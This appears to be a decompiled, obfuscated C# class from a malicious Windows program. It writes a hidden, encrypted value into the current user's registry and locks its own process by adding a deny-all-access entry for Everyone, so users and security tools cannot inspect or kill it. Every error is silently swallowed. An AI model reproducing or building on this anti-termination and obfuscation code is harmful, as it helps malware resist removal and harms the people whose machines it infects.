using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fmTenshUnV;

internal sealed class mXYOWVOrqAnZiu
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ItamAAEFLZwYi, int ZMnKUyhdRj, [Out] byte[] XtrWzxrOpUq, uint DTHeKYUCdFoD, out uint RzAPwmBvESU);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr kYwWPwZLjuQO, int GzgVLNLTATJ, [In] byte[] xsGefSfrss);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void kUlTMDSCgmEil(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107404686)));
			registryKey.SetValue(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107404581)), getString_0(107405638));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor sufLrgHjvwrbrss(IntPtr intptr_0)
	{
		byte[] xtrWzxrOpUq = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, xtrWzxrOpUq, 0u, out var RzAPwmBvESU);
		if ((long)RzAPwmBvESU > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, xtrWzxrOpUq = new byte[RzAPwmBvESU], RzAPwmBvESU, out RzAPwmBvESU))
		{
			return null;
		}
		return new RawSecurityDescriptor(xtrWzxrOpUq, 0);
	}

	private void BZUOcaaqRNxM(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void maZTILbGYPdjP()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = sufLrgHjvwrbrss(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			BZUOcaaqRNxM(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static mXYOWVOrqAnZiu()
	{
		Strings.CreateGetStringDelegate(typeof(mXYOWVOrqAnZiu));
	}
}
